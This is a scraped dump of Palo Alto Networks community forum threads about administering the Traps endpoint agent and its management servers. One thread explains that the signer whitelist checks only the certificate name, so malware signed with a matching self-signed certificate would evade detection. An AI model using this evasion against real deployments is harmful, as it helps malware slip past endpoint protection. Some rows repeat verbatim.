195,218197,ElasticSkyX,Sorry meant TSM 🙂Not 100% familar with the new Traps client but can you check C:\ProgramData\Cyvera\Logs (if it exists) for a Service_<hostname>.log If there is one are you able to upload the latest version so we can review? Remove any site specific information before uploading if you prefer 🙂Kind regards.,0,06-24-2018,11:03 PM
196,218197,JacobHusted,HiCan I upload i to Palo Alto Support and not having the logfile in thisstring ?/Jacob,0,06-24-2018,11:17 PM
197,218197,ElasticSkyX,"Hi Jacob,You can do that. I'm not with Palo Alto support so will not be able to review.I cannot see any other way to ping each other privately or I would have suggested uploading to DropBox/GoogleDrive/OneDrive and sharing the file with me (ReadOnly of course).If you go down the PA support path, please let the community know what they discovered. It could be helpful to others 🙂Thanks.",0,06-24-2018,11:24 PM
198,218197,JacobHusted,"HiI will contact support and notify, when a solution is provided .Thx. Glen./Jacob",0,06-24-2018,11:40 PM
199,218197,Jan_Linhart,"Ji Jacob,I have just encountered the same issue, could you please share support solution?Thank you,Jan",0,10-23-2019,02:57 AM
200,293850,ancis,"@RichardP11It is not a hard requirement to reboot. But if the servers are production boxes, ideally (after testing, always test upgrades in a sandbox before upgrading production systems.) the upgrade would be deployed during a patching cycle. The reboot allows the agent to benefit from any new drivers or modules that require a component to load on boot.",1,10-23-2019,07:03 AM
201,293372,Abdul_Razaq,"Hi Team,I have figured out the changes needed to be done in the server having core and console installed.these configuration steps helped me to get the TRAPS in action after service account password change.",0,10-21-2019,04:16 AM
202,160172,Willian,"Hi@MHamadThe following table presents the minimal Traps network bandwidth requirement (per 16k agents)Multi ESM Considerations If Multi ESM is not used – make sure to disable ‘Multi ESM’ feature from the ESMIt is recommended to use more than one ESM Server in one of the following scenarios:- Agents are located in different geographic locations- More than 16,000 agents are planned to be deployed- High availability/Disaster Recovery scenariosTo have Multi ESM environment functioning effectively it is required to have latency lower than 100ms between ESM Servers & the MS SQL database.When multiple ESM Servers are required it is recommended to have a forensic folder on every ESM server, this will require an installation of IIS and BITS in the ESM Server (even if it doesn’t have ESM Console installed on the same server).3I hope this helps.Willian",2,06-09-2017,05:11 PM
203,160172,JosueQuinto,"En el caso de TMS, ¿cual seria el consumo de ancho de banda de los puntos finales?",0,10-09-2019,12:07 PM
204,160172,ancis,"For every 100,000 agents, you will need to allocate 120Mbps of bandwidth. The bandwidth requirement scales linearly. For example, to support 300,000 agents, plan to allocate 360Mbps of bandwidth (three times the amount required for 100,000 agents).https://docs.paloaltonetworks.com/traps/tms/traps-management-service-admin/get-started-with-tms/plan...",0,10-09-2019,12:11 PM
205,160172,joseph.liwanag,"Hi,Good day. I would like to check if Palo Alto Traps Endpoint security can work over satellite network with latency varying from 700 - 2000ms and speed from 512kbps to 1Mbps?Thanks,Joseph",0,10-16-2019,06:53 AM
206,290360,hu_omi,"Hi,I can feel your pain, same here. I hope in future it is a part of TMS, AD sync with all systems, red marked all systems without Traps Agent, orange all Agents not anymore communicating and green is in AD and working, somthing like that.Another question, why is nessus not working for you? if you can logon with credentials, you can search for files and you should check if a a file is existing, but you need crediantal checks.Kind regardsFabio",0,10-02-2019,01:25 AM
207,290360,FrankBussink,"Hi,scanning with Nessus works like a charm for me.Did you made sure to scan with Nessus in Credential mode ( providing username/local with local admin account ? )RegardsFrank",0,10-14-2019,03:06 AM
208,292448,ancis,"@RichardP11 Is there a specific reason to use traps cleaner as a second step? when using traps cleaner the reboot is required to completely unload the drivers, and for final deletion of files that were in use during the time of Uninstall via cytool.",0,10-11-2019,06:25 AM
209,292448,RichardP11,We just want to make sure that the new fresh install traps will work normally after the uninstall. I am not sure also on this steps. Could you suggest? Is the uninstall via control panel is enough?,0,10-11-2019,06:32 AM
210,292448,ancis,"@RichardP11Ideally you would use the built in upgrade. You can create a One-Time action to upgrade the endpoint. There can be several reasons an upgrade fails, most of the time it is due to the system needing a reboot, for other system configuration changes to complete. Also, Palo Alto networks Support can help through the upgrade process, should you run into any issues.",0,10-11-2019,06:35 AM
211,292448,RichardP11,"Yes We tried that on the actions to upgrade the traps. Sad to say we dont have palo alto support, We just have vendor support.I tried the actions and it just applied and never delivered. Every task failed. So now we move on using Autofac.",0,10-11-2019,06:39 AM
212,292448,ancis,"I am not familiar with AutoFac, sorry.If you are having failures, you should be able to collect a set of support files and send to the vendor support team. Should they be unable to resolve the issue, they can escalate to Palo Alto Support.That said, if all of the systems fail to upgrade, I would check the uninstall password being used. You can create a one-action and attempt to upgrade your own system. Should it fail, review the logs, it will generally give you an idea of the issue. If it succeeds, you can copy the one-time action and apply to more systems in your environment.",0,10-11-2019,06:43 AM
213,292448,RichardP11,Would that require a reboot when upgrading from ESM?I remembered that Traps 4.1.3 cant handle upgrades coming from ESM. The vendor said that We should first upgrade to 4.2.X to use that feature.,0,10-11-2019,06:46 AM
214,292448,ancis,"for upgrades to the 4.2.x range, There is an upgrade plan:https://docs.paloaltonetworks.com/traps/4-2/traps-endpoint-security-manager-new-features/upgradedown...https://docs.paloaltonetworks.com/traps/4-2/traps-endpoint-security-manager-new-features/upgradedown...",0,10-11-2019,06:50 AM
215,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
216,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
217,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
218,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
219,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
220,292252,KenMannCollege,What did the Traps agent log say was going on?,0,10-10-2019,05:52 AM
221,291523,donohoe23,solved this by upgrading vm workstation 🙂great feature works well.,0,10-04-2019,06:53 PM
222,290123,BatD,"@BobRoflThis is probably a question to ask Azure support, but looks like Azure Security Center only supports monitoring of some endpoint vendors as in the article belowhttps://docs.microsoft.com/en-us/azure/security-center/security-center-endpoint-protection",0,09-27-2019,05:33 AM
223,247759,AbdulRahman_Safaria-labelwat,@iweltagwere you able to identify the issue from PA supprot?,1,02-02-2019,10:20 PM
224,247759,christoph_oppelaria-labelt,"I kind of did myself before i had a meeting with the Support.As the Error says, there is some issue with GET Requests not being allowed. So i had to go into the IIS-Settings, go to the right Application (in this case the BitsUploads), and add the Verb ""GET"" to All-Users.EDIT: i just noticed that the Upgrade to version 4.2.3 reverted my changes and it also didn't work until i fixed it again.",2,02-03-2019,11:11 PM
225,247759,UrosSustar,Thank you for the workaround!Did you also open the TAC case for the issue? I wonder if it's a bug or a feature 🙂,0,09-25-2019,01:25 AM
226,247759,christoph_oppelaria-labelt,"Hello,it looks like it was a bug, but i can't say for sure if it was caused by one of the ESM Updates or an IIS update directly. I opened a TAC case and they were able to help me fix the issue, without the workaround.In our case, configuring an application pool identity did the trickMore on the issue here: https://support.microsoft.com/en-us/help/907273Hope it helps",0,09-25-2019,02:01 AM
227,247759,UrosSustar,"Hi,Thank you for your reply.Do you remember what did you have to do? Which identity did you use for ESMAppPool, the service account used for database connections? Were there any special permission needed?The thing is that I already set the identity for the app pool, but still doesn't work without putting GET verb.",0,09-25-2019,02:26 AM
228,286300,ancis,"@Stephen24I answered your other post, with a complete answer. Your other post had more details.",0,09-03-2019,07:26 AM
229,286300,Stephen24,"Hello@efrancis ,Ok, thanks",0,09-03-2019,08:21 AM
230,286260,ancis,"I would recommend making sure your DB is up, and you have proper disk space. A dependency service has failed to start. Meaning the Traps service is unable to start because a service it depends on, is not started.Palo Alto support can help you troubleshoot this as well.",0,09-03-2019,07:36 AM
231,286260,codegeas,"Hmm, will check disk space and DB service on ESM serverThank you",0,09-03-2019,08:00 AM
232,286191,ancis,"@Stephen24If you have an internal app that is now stopped by traps, there are a couple of things to check. Did the App update recently? did you update Content Updates in the Traps env.? If you an answer No to either of these questions, it is recommended to reach out to support to make an exception as well as inform the engineering team of your internal app, and potentially make a conent update team to avoid this issue in the future.",0,09-03-2019,07:25 AM
233,246286,DavidHood,"Hi@JokinLete, did you manage to fix this issue? Could you share the solution? We are experiencing the same problem on our end.",0,08-13-2019,02:57 AM
234,246286,SoporteITS,"Hi,We have deployed a new installation with same infrastructure using the latest version of Traps ESM.With the new version is seems that it is solved, but we have not change the VDI Endpoints to the new infrastructure.What version are you using?How is the license revocation configured?Regards.",0,08-13-2019,03:29 AM
235,246286,DavidHood,ESM server is 4.2.3 with the VDI machines being 4.0.1 Automatic license revocation is enabled and is set to every 31 days.Thank you,0,08-13-2019,03:32 AM
236,246286,SoporteITS,"Hi,Can you check the agent logs, and also the logs of the Core and Console?Also are you able to upgrade the agent version? 4.0.1 is not supported by Paloalto so if you open a TAC case they will tell you to upgrade it.Regards.",0,08-13-2019,04:01 AM
237,246286,DavidHood,"We are in the process of rolling out a new VDI environment with the latest TAC version. The current environment is 4.0.1 however we could potentially roll out a new version if this will fix the issue.The agent logs don't seem to be showing anything of interest - agent logs are just showing agent status changing and content updates etc, however the ESM logs do have one error which is agent license validation failed.",0,08-13-2019,04:21 AM
238,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
239,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
240,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
241,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
242,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
243,277447,BPry,"There is no specific permission to control this access. I would reach out to your SE and put in a Feature Request for it, and then share the number here so that everyone can add their vote to it. I imagine that this would be a feature already in the pipeline, as it's a common sense RBAC request to be made, but we might be able to speed it along with enough votes behind the request.",0,07-18-2019,08:51 AM
244,277447,Chacko42,FR ID:12040 - Secure Endpoint Live Terminal access with additional authentication levelRegardsChacko,5,08-01-2019,05:13 AM
245,276814,ancis,"Does the server hosting the ESM, have enough space to write the file?",0,07-22-2019,03:32 PM
246,276814,AbdulRahman_Safaria-labelwat,"Thanks@efrancisfor the suggestion, however there is no disk space issues, anyways if it is disk space it should atleast timeout or show as failed, it seems that the job id is stuck, so I raised it with PA TAC, and indeed, they provided an SQL query which cleared the job, and the issue is resolved.But thank you for stopping by@efrancis",0,07-24-2019,12:52 AM
247,276814,shp555,@AbdulRahman_SafwatDid you happen to save that command? I'm running into the same issue.,0,07-30-2019,10:57 AM
248,276814,AbdulRahman_Safaria-labelwat,"Hey@shp555,I would really recommend that you directly reach out to PAN support, as running changes on the DB can cause real issues if it was done wrong, they will provide you with the steps and the queries needed, and also will follow up with you if any issues happen.Regards",0,08-01-2019,01:40 AM
249,258557,BPry,"@Miroslaw_Iwanowski,The name would just be the CN field yes. To the best of my knowledge, and in my experiance, once you whitelist a signer it's only looking for that field and it never checks to see if the certificate itself is valid or if the certificate has been revoked.The documentation is correct; you shouldn't be utilizing SHA1 to sign anything anymore, let alone your certificates.",0,04-24-2019,06:40 AM
250,258557,Miroslaw_Iwanowaria-labelski,"OK, thanks.No, documentation is wrong. Documentation is mentioning signature thumbprint and not hash algorithm. Thumbprint should be SHA1.There is another question. Does Traps check for validity of certificate? If I will create a self signed certificate with the same name - will it work?",0,04-24-2019,11:06 AM
251,258557,BPry,"@Miroslaw_Iwanowski,Traps is only looking for the Signer of the package; it doesn't matter if that is a Trusted Issuer or not. Traps is simply seeing if the trusted signer of say ""Test Code Signing"" matches the signer of the package.",0,04-24-2019,11:48 AM
252,258557,Miroslaw_Iwanowaria-labelski,"Do I understand correctly that I can check for issuer name, generate a self signed certificate with the same name and sign my malware and then avoid beeing checked by Traps if it whitelist that CN?",0,04-24-2019,12:15 PM
253,258557,BPry,"@Miroslaw_Iwanowski,Correct. The Whitelisted Signer is simply looking at the CN, and if you know that ""My Company"" is how I sign my custom apps and send a targeted malware campaign with it signed as ""My Company"" and it's whitelisted in traps my malware will run the same as your custom app.",0,04-24-2019,07:04 PM
254,258557,Miroslaw_Iwanowaria-labelski,So it is more like a vulnerability not a security feature. Shame.,0,07-25-2019,11:56 AM
255,278746,BPry,"@BrandonWright,What verision of Traps are you using. Regardless of version, you can whitelist a file on a case by case basis, instead of whitelsting the excel process which would be rather ill-advisable.",0,07-24-2019,12:57 PM
256,278746,BrandonWright,"Hello@BPry,I don't believe your statement is accurate, you can't really whitelist an excel document file, since as I understand it, Traps protects and evaluates processes/executables on execution, and in the scenario I'm referring to, it would be the Excel.exe process executing and running displaying/presenting a file that has a macro that causes Excel.exe to run a child process that appears suspicious to Traps. This means Whitelisting the xlsx filename or file hash likely does nothing.How do you make a child process protection exception to an individual Excel document file? For example, there is nothing that I have access to that allows me to turn off child process protection on Excel.exe when it is opening a certain file, but does support have this ability? The reason I'm asking is that the only option I have is to make an exception to a process name (process name being Excel.exe, which I already know is not a good idea). I guess to reiterate I was looking for whether it's possible for support to create this type of exception as an Advanced Exception, or is there anyone out there that has had this scenario, and what did they do?I'm using Traps 6.1 by the way.Thanks,Brandon",0,07-24-2019,07:24 PM
257,278746,BPry,"@BrandonWright,So your maco execution can be whitelisted by going into the Malware profile and looking at the ""Examine Office Files with Macros"" area, which will allow you to add a Whitelisted file. This should stop Traps from triggering the Malicious Child Process protections. If not, how you would whitelist the process is by looking at the detection logs and seeing how it identifies the Parent/chile process and the CLP that was utilized. You would then build the chain under ""Prevent Maclicious Chile Process Execution"".",0,07-25-2019,06:56 AM
258,278746,BrandonWright,"Hello@BPryThanks for the update on this, I'll give this a try today, and update the post if it works.",0,07-25-2019,07:00 AM
259,278746,BrandonWright,"Hello@BPry,So I tried adding a file to the whitelist for the Malware profile under ""Examine Office Files with Macros"". This allows the file to open, but as I suspected, A ""suspicious process creation"" event is still triggered when the macro is run. This is because in this scenario Excel.exe is starting a child process of schtasks.exe.  You are correct though in your statement about if that doesn't work, you can put it in the ""Malware Profile"" and allow Excel.exe to launch something like schtasks.exe with very specific parameters. In the end, it would be allowing Excel.exe as a whole to perform a very specific task, which isn't all that bad. As an example, I've attached a screenshot of the exception I made for a fictional excel file I created with a macro to set a scheduled task.Wildcards can be used in the Command Line Params as well.Thanks,Brandon",1,07-25-2019,08:57 AM
260,247584,tobar,"Hi@MarkRoseneckerThat behavior is beacuse the office macro analysis is much powerful in TMS than ESM (at least on version 4.0 and 3.x).I sugest to you open the event and analyses the path and files/libraries vinculaded, then put that event on excepcion if you are completely sure that is clean or create a rule for especific host, but leave the JIT Mitagation disabled is not a best practice.The best regards,Walter Tobar",0,01-25-2019,06:51 AM
261,247584,MarkRosenecker,"That was my first inclination...that macros were triggering it. However, Excel did not show any macros whatsoever associated with those files.",0,01-25-2019,06:52 AM
262,247584,tobar,"May you post the event (blur IP addresses and hostname/username) ?Regards,wtobar",0,01-25-2019,06:58 AM
263,247584,Burns,"We had this issue too, it turned out to be an incompatibilityissue running along Trend Micro OfficeScan. Support created an exception file for us to resolve the issue.",0,07-24-2019,01:57 PM
264,256108,Burns,"Hello,If you disable Local analysis it activates that setting. You are essentially saying, do not use local analysys for a verdit, and wait for Wildfire before allowing this to run.",0,07-24-2019,01:50 PM
265,277677,ancis,ESM and TMS based agents handle the connection to the managment server diffrently,0,07-19-2019,07:48 AM
266,277677,TimNie,"Okay,Unfortunately this does not answer my question.Is it possible to change this address on the client, or can it only be done via ESM/TSM?",0,07-21-2019,10:49 PM
267,277677,ancis,"@TimNieESM, yes. requires several steps, but yes you can.TMSno you cannot. The installation package contains the server's address",0,07-22-2019,06:36 AM
268,160996,ancis,"Yes it is possible. Here is a step by step (assuming install was default options):Database migration:Core: Program Files\Palo Alto Networks\Endpoint Security Manager\ServerConsole:Program Files\Palo Alto Networks\Endpoint Security Manager\Web\bin***If no errors starting services, Start WWW Publishing services***Things to consider:Every CORE and CONSOLE has its own Hibernate file, and must be updated.",3,06-13-2017,08:35 AM
269,160996,Douglas_Zan,"Thanks efrancis for the reply.What about the database backup and restore process? Just backup and restore it to the new server? Is the regular process enough, or there are some details to take into account?",0,06-13-2017,08:46 AM
270,160996,ancis,"From my experience, a Full backup was done on old SQL instance, moved to new, and restored.",0,06-13-2017,08:51 AM
271,160996,jvanbatenburg,"I have an issue with hibernate.cfg. We use 2 Traps servers; one in server vlan, one in DMZ. I moved the databases, configured a new connection to inside Traps server. My Traps server in DMZ connects through SQL account (and TrapsDB is on instance SERVERNAME\INSTANCE_NAME, listening on port 1433firewall between Traps in DMZ and SQL server only allows port 1433.I can connect through odbcad32, I tried all kinds of writing down SQL destination, but I cant start ESM service (in eventvwr: error in hibernate.cfg",0,09-24-2018,05:45 AM
272,160996,ancis,"If you are having issues starting the services because of hiberante file, I would recommend to open a case with support, who can assist making sure the migration was done correctly. There can be a few reasons why the connection fails when trying to start the services.",0,09-24-2018,05:49 AM
273,160996,peticom,"HelloWe have done this procedure, the only thing missing is to verify the instances, to start the services thanks for the helpRegards",0,11-26-2018,03:23 AM
274,160996,SoporteITS,"Hi,Thank you!! We have done it in the version 4.2.4 and it works fine!In our case the installation is with 2 cores and 1 console.",0,07-11-2019,05:09 AM
275,160996,MarcinSt,"Hi.Thank all of you for this topic. It is really valuable knowledge.I have another question about MSSQL usage: did someone ever try to use AWS-based MS SQL (Amazon RDS for SQL Server) instead of on-prem MS SQL? My ESM is built as AWS EC2 instance and it would be highly desirable not to use the server-based DN.So, anyone?Best regards 🙂Marcin",0,07-11-2019,05:51 AM
276,275015,BPry,"@Alex_Samad,The signer of this application is placed in Traps blacklisted signers; you would need to override this by whitelisting the signer Wen Jia Liu; but I would generally recommend not doing so unless you've fully analyzed the EXE and verified it isn't doing anything abnormal, as PAN is usually pretty good about actually only blocking known bad signers and that file doesn't have the best VirusTotal report.edit:To whitelist a signer go into your Malware profile and it'll be under the 'Examine Portable Executables and DLLs' section under ""Whitelist Signers"". DOCSJust FYI I would recommend against whitelisting external signers. I would utilize the Whitelist Files function instead, so you can verify that whatever whitelisted EXE is actually secure.",0,07-05-2019,11:24 AM
277,275015,Alex_Samad,"HiWhat I have done is over ridden the hash, happy with the file maybe not happy with the rest of the signed stuff.Now a question about whitelisting certs.Thats a text string and its regexed against certs ?I can't find what is acceptable for that field.can I do^Wen Jia Liu$or can I only doWen Jia Liudoes that mean that it will accept ""Wen Jia Liu Reall Bad"" as well or even ""OWen Jia LiuS""thanks",0,07-07-2019,02:47 PM
278,275011,BPry,"@Alex_Samad,You'll actually do this in a seperate ""app"" available in the hub (app.paloaltonetworks.com) called Log Forwarding. The below guide will walk you through getting everything setup to either send to your SIEM or via email.GUIDE",1,07-04-2019,07:58 PM
279,275011,Alex_Samad,"Thanks, thats what i was looking for.Also the emails are ugly - any way to send the same type of emails that we used to get from the EMS",2,07-04-2019,09:43 PM
280,275011,BPry,"@Alex_Samad,I have to admit I laughed at that; the emails are in standard syslog format, so yes you are correct they are ""ugly"" I guess. Unfortunately to the best of my knowledge there is currently no plan to ""beatify"" them at the moment.",0,07-05-2019,07:16 AM
281,273359,BPry,"@Alex_Samad,You sure can, and without any issues. When you have your TMS instance setup you'll actually be able to generate an agent installation specifically for upgrading from an existing EMS managed agent. There really aren't any gotchas with it as long as you verify that any agent that was on EMS is actually shwoing up in your TMS instance and is showing as active.",0,06-27-2019,08:30 PM
282,273359,Alex_Samad,"HiThanks, so I have create TMS and set it up, I believe - I can log into it.So i think the next steps is to migrate any polices or stuff from my on premise traps install - seems like I can export and import stuff.Then you are suggesting I can download something from my TMS to install on my machines that will automatically repoint them to the new locationCool.I used to send my logs to my panorama box is there any way to do that from TMS back into my panorama on premise",0,07-02-2019,09:25 PM
283,273359,Alex_Samad,"@BPry Do you know of any document that outlines the best practise setup for TMS. I am having issues exporting the current config from my EMS, so I am thinking I might redo the polices - wouldn't mind basing it upon what PA consider best practiseGo an upgrade package - how can I install the uninstall password so that the upgrade can happen without user intervention",0,07-03-2019,07:48 PM
284,273359,BPry,"@Alex_Samad,The configuration doesn't match, so you'll need to re-create your policy in TMS and can only utilize the EMS configuration as a baseline to what you need to make for TMS. Youll then want to ensure that your agents have been upgraded to the latest release to ensure that the migration goes smoothly.When you generate the package on TMS you'll actually deploy that package through EMS, just be sure you've disabled service protection for the agents you're upgrading.You can find the guide within the TMS admin guide as far as how you would perform the upgrade step by step.",0,07-04-2019,07:29 PM
285,274135,JNK_90,"Hi,yes I think you can. Try this one:When you open up IIS Manager on the esm, go to Default Web Site and click on ""Basic Settings..."" at the right side of the IIS window.In the pop up window you should see the wrong user entry. Now you can click on ""Connect as..."" and insert a local administrator. Save it and reboot IIS.Now it should work.Kind regards,Jan",1,07-04-2019,03:41 AM
286,274829,Alex_Samad,"Okay seems like its easy , download package from TSM and upload as agent update in ESM ..",0,07-04-2019,12:26 AM
287,272657,BPry,"@BizBo,Currently have 6.0.2 running on over 1500 clients and haven't noticed, or had any issues reported, regarding CPU utilization. CPU Utilization is pretty locked down in Traps so that something like this doesn't happen, are you sure it's spiking the CPU and not some other resource?",0,06-27-2019,08:32 PM
288,131943,JDominguez,"Hey Community,I need some help with a deployment architecture.For a small install (less than 1000 end points) can both the DB and the EMS Console&Server be hosted on a single virtualized server?Or should we deploy the solution with 2 dedicated servers:1x server = ECM Console and ECM Server on same machine1x database server = SQLite OR SQL 2014 – not sure which one?According to the below documentation, the install can be done using one server.https://www.paloaltonetworks.com/documentation/40/endpoint/endpoint-admin-guide/traps-deployment-sce...Any help/feedback is much appreciated.- JD",0,07-11-2017,12:20 PM
289,131943,Willian,"Hi@JDominguezBased on your description, there are two applicable options: Standalone Deployment and Small Single Site Deployment.Standalone DeploymentThis design is typically recommended forinitial proof of concept (POC) or a small site with fewer than 3000 Traps agents, use a standalone deployment to install the following Endpoint Security Manager (ESM) components on a single server or virtual machine:• ESM Server• ESM Console• Forensic (quarantine) folder• DatabaseI don't recommend to any of my customers to use this design in production, as it does not provide any redundancy for console or cores.Small Single Site DeploymentAs per the link you posted, and the official admin guide, this design requires:This is the minimal I always recommend to all my clients due to the redundancy aspects and flexibility.Now to your questions.My recommendation is that you adopt theSmall Single Site Deployment1 x ESM Console + Core (Combined)1 x ESM Core (Redundancy)1 x Database Server - Notice that SQLITE is no longer supported or recommended by Palo Alto even in POCs; hence, the official recommendation for environments with more than 250 endpoints is SQL Server Enterprise or SQL Server Standard as per the below screenshot.Important: You only can have one console installed.For further details on requirements please refer tothe following for the administrator guide: link:https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/technical-documentation/40/endpoin...I hope this helps.",2,07-13-2017,12:45 AM
290,131943,JDominguez,"Hi @Willian,The above helps alot! Thanks for the time and effort you put into your reply - it's much appreciated!I'm sure many more folks will be using this post for reference.Regards,Josh Dominguez",0,07-13-2017,07:04 AM
291,131943,ESutedy,"Hi,I cant seem to find a setting to change the date format from m/d/y to d/m/y.If the setting is not there, how do i make suggestion to PA to add these setting?Thanks",0,09-06-2017,06:12 PM
292,131943,MyBudget,"I logged the same request as a bug under 4.0.1 a while back and was advised that it would be addressed in a future version, so I expect that it is on a road-map somewhere.Much as I can work with m/d/y formatting, it's nice to have the d/m/y formatting that we are used to and have with our other products, like Windows, McAfee, SQL, Office, SAP, Exchange (ok - maybe not so much Exchange - backend Powershell prefers m/d/y).",0,10-12-2017,09:38 PM
293,261102,khuynh,"For any feature request, please refer to your Palo Alto Networks local representatives, they will be able to help / forward your FR.",0,06-04-2019,06:03 AM
294,261752,khuynh,"Hi,The event means that Traps detected an attempt to exploit a Windows process.They are several types of memory corruption exploit, you can find a list here fyi :https://docs.paloaltonetworks.com/traps/3-4/traps-endpoint-security-manager-admin/exploit-protection...The way to ""solve"" these events (and more generally any Traps events) is to investigate further to see if it's an expected behavior (so these events = false positives) or if it's a real threat detected on the systems. To investigate, you can retrieve data from the endpoints, you can ask help from your partners, etc. If its a False Positive, you can create an exception to exclude similar events, so they will not appear anymore on the GUI.",0,06-04-2019,06:01 AM
295,191747,cmaiorino,"Got this to finally workby SMTP-RelayGo to your Admin Console (admin.google.com) > Apps > G Suite > Gmail. Then go to Advanced settings > Routing > SMTP relay services.Next to the setting named ""Internal Servers"" > Click Edit.Add the external IP address that will send the email and a range if it more then oneplease check ""Require TLS"" and Save the settingAfter you save the changes, please go to the application's setup and for Host server use: smtp-relay.gmail.com And for port try again 587.Make sure your user name is password is correct...test email...",0,08-03-2018,11:38 AM
296,191747,Sandeep_R,"Hi Dears,We are trying to enable Email Reporting on ESM server.Filled all the required fields with correct information. Using the account which has accessibility to the SMTP Server.Tried configuring with SSL Enabled and Disabled, but no luck. getting error - Failed to Send Test Message.Attaching the error screen shot.Kindly help getting this issue resolved..Regards,Sandeep",1,09-25-2018,10:59 PM
297,191747,ancis,"Sandeep,I would recommend to reach out to Palo Alto support. Any of the support engineers would be more than happy to validate the settings for you, and answer any other questions you may have.",0,09-26-2018,05:05 AM
298,191747,RLI27,was this ever solved?I am seeing this now again with ESM V4.2.4 (V4.2.3 was working - see topic opened today),0,04-09-2019,08:11 AM
299,191747,cmaiorino,,0,04-09-2019,08:16 AM
300,191747,RLI27,"Thx cmaiorinoI'm asking not in reply of the initial Gmail question, I'm asking in Reply of Sandeep_R - sorry for the confusion...",0,04-09-2019,08:21 AM
301,191747,RLI27,"Just to inform the community about the solution of problem faced by ""Sandeep_R"":I had a (long) case open with paloalto networks. They confirmed that they havechanged the whole eMail Framework with ESM Update V4.2.3 to V4.2.4 (I could not find this in the release notes...). With that change they have a now confirmed bug with smtp servers without certificate AND without user authentication (before we used no certificate, no user auth). They promised to fix in upcoming V4.2.5. To workaround the problem I installed a valid certificate on my smtp receiver first. In addition I was not able to add user authentication in our prod environment and that is why paloalto networks support provided a engineering fix where I had to replace two dll's. For the momment it works - I will check after upgrdaing to V4.2.5 again...",0,05-13-2019,05:47 AM
302,258247,thomaskoetsier,"Use the command ""cytool log collect"" which should export the logs to a TGZ you can download.",1,04-22-2019,11:53 PM
303,258247,JasonFerris,"Thank you thomaskoetsier. I guess my question was do logs from blocked traffic or activity get logged in log files directly on the server and if so how large does the repository for logs get or where is it? If it's only 5G then I don't think the logs were the culprit. I wasn't looking to check logs at all I was more curious how large this grows. No changes were made to any configuration of logs etc so whatever default values there are, that is what is set at the moment.Thanks much!",0,04-23-2019,07:17 AM
